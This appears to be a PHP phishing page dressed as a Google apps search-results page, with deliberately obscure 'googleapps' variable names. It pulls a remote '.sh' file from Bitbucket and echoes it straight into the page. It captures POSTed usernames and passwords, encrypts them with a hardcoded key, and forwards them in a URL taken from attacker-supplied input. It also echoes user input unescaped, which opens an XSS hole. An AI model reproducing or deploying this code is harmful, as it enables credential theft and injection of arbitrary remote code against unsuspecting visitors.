<?php

$googleappsgooglemobileapps8884 = "$_POST[url]";

?>

<?php

$mobile = "$_SERVER[REQUEST_URI]";
$mobile = str_replace('/','',$mobile);
$mobile = str_replace('?','',$mobile);
$mobile = str_replace('q=','',$mobile);
$mobile = str_replace('-','+',$mobile);
$mobile = str_replace('&','',$mobile);
$mobile = str_replace('logout=1','',$mobile);
$mobile = preg_replace('/username=(.*?)$/','',$mobile);
$mobile = preg_replace('/([0-9]+)/','',$mobile);
$installgoogleappsmobileapps84 = "$mobile";

$installappsmobileapps84 = "$mobile";

?>

<head>
<title><?php echo "$googleappsblog"; ?></title>
<meta name='description' content='<?php echo "$google84"; ?>'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=no">
<meta name="robots" content="index,follow">
<link rel="shortcut icon" href="http://mobile84.herokuapp.com/googleappslogoapps88888844.png" type="image/x-icon"/>
</head>

<?php

$file_data84 = file_get_contents('https://bitbucket.org/christoh85/mobileappsinstallapps84/raw/master/googleappswebsiteapps84.sh');

echo "$file_data84";

?>

<style>

html
{
background-color:#f2f2f2;
}

.googleapps84
{
font-size:26px;
text-align:center;
font-family: Varela Round, sans-serif;
background-color:#ffffff;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
border-bottom-width:2px;
}

.googleapps8884
{
font-size:26px;
font-family: Varela Round, sans-serif;
}

.googleappsinstallapps84
{
background-color:#4285f4;
font-size:18px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
}

.googleappsinstallapps8884
{
padding:16px;
color:rgba(0,0,0,.54);
background-color:#f8f8f8;
font-family: Varela Round, sans-serif;
}

.googleappsgoogleapps84
{
width:72%;
margin:auto;
margin-top:104px;
}

.google8884
{
padding:16px;
}

@media screen and (max-width: 960px)
{
.googleappsgoogleapps84
{
width:100%;
margin:auto;
margin-top:0px;
}
}

</style>

<div class="googleappsgoogleapps84">

<div class="googleappsgoogleapps8884">

<div class="googleappsinstallapps84">
<div class="googleappsinstallapps8884">

previous page

<style>

.divapps84 {
  box-sizing: border-box
}
.divappsmobileapps84 {
  box-shadow: inset 0 0 3px 0px #484848, 0 0 6px 0px #484848;
  width: 18px;
  height: 18px;
  margin: 0 auto;
  border-radius: 50%;
  border-top: 4px solid #2E7D32;
  border-right: 4px solid #EF6C00;
  border-bottom: 4px solid #EF6C00;
  border-left: 4px solid #2E7D32;
  transform: rotate(54deg);
  position: relative;
  float:right;
  margin-top:-2px;
}
.divappsmobileapps84:before, .divappsmobileapps84:after {
  content: "";
  position: absolute;
  left: -4px;
  top: -4px;
  width: 100%;
  height: 100%;
  border-radius: 50%;
}

.divappsmobileapps84:before {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(60deg)
}
.divappsmobileapps84:after {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(30deg)
}

</style>

<div class="divappsmobileapps84"></div>

</div>
</div>

<div class="googleapps84">

<div class="google84">
<div class="google8884">

<?php

$googleapps8884 = "$_GET[url]";

preg_match_all('/\.(.*?)\./', $googleapps8884, $googleapps84);
$google84 = $googleapps84[0][0];
$google8444 = str_replace(".","",$google84);

?>

<style>
/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 0; /* Sit on top */
    padding-top: 100px; /* Location of the box */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
}

/* The Close Button */
.close {
    color: #aaaaaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
    margin-right:12px;
}

.close:hover,
.close:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
}

@media screen and (max-width: 960px)
{
.modal-content
{
width:100%;
margin-left:0px;
margin-top:55px;
border-style:none;
background-color:transparent;
}
.modal-content84
{
margin:8px;
}
.close
{
margin-top:8px;
}
.googlemobileinstallapps888844
{
top:34px!important;
left:96px!important;
}
}

.googlemobileinstallapps888844
{
width:172px;
height:44px;
background-color:#ffffff;
color: #545454;
font-size: small;
margin: 0px;
padding:8px;
line-height: 1.4;
position:absolute;
top:72px;
left:608px;
}

.triangle {
  box-sizing: border-box;
}

.triangle {
  display: inline-block;
  margin: 0 5px;
  vertical-align: middle;
}
.triangle-5 {
    width: 26px;
    height: 30px;
    border-top: solid 12px #ffffff;
    border-left: solid 16px transparent;
    border-right: solid 16px transparent;
    margin-left:130px;
    margin-top:-4px;
}

.pulsate {
color:#222222;
font-weight:bold;
font-size:12px;
}

</style>

<!-- Trigger/Open The Modal -->
<button id="myBtn" style="display:none;">Open Modal</button>

<!-- The Modal -->
<div id="myModal" class="modal">

<!-- Modal content -->
<div class="modal-content">
<div class="modal-content84">

<span class="close">&times;</span>

<div class="googlemobileinstallapps888844">

<div class='pulsate'>We recommend these links</div>

we recommend any of these links

<div class="triangle triangle-5"></div>

</div>

</div>
</div>

</div>

<script>
// Get the modal
var modal = document.getElementById('myModal');

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
    modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
    modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

<div style="text-align:left;">

logged in

</div>

<?php

$googleapps8884 = "googleappsphpapps84.php";

$googleapps88888844 = "$_POST[username]";

$googleapps888844 = "$_POST[password]";

?>

<?php

$date = date("Y-m-d");

?>

<?php

$string_to_encrypt88888844="$googleapps88888844";
$password88888844="googleapps84";
$encrypted_string888888884444=openssl_encrypt($string_to_encrypt88888844,"AES-128-ECB",$password88888844);

$string_to_encrypt88884474="$googleapps888844";
$password888844="googleapps84";
$encrypted_string88884474=openssl_encrypt($string_to_encrypt88884474,"AES-128-ECB",$password888844);

?>

<div style="text-align:left;">

go to the search result <a rel="nofollow" onClick="window.open('<?php echo "$googleappsgooglemobileapps8884/?q=$_POST[q]&username=$encrypted_string888888884444&password=$encrypted_string88884474"; ?>','_self')">page</a>

</div>

</div>
</div>

</div>

</div>

</div>

